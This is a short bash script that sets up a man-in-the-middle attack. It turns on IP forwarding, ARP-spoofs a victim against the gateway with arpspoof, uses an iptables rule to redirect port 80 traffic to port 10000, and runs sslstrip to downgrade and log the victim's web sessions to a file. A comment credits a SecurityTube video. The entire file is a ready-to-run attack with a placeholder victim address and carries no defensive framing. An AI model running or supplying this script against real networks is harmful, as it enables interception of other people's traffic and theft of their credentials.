#!/bin/bash

echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t <victim ip> <gateway>
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
sslstrip -w secret

# from http://www.securitytube.net/video/193
# arpspoof is part of dsniff
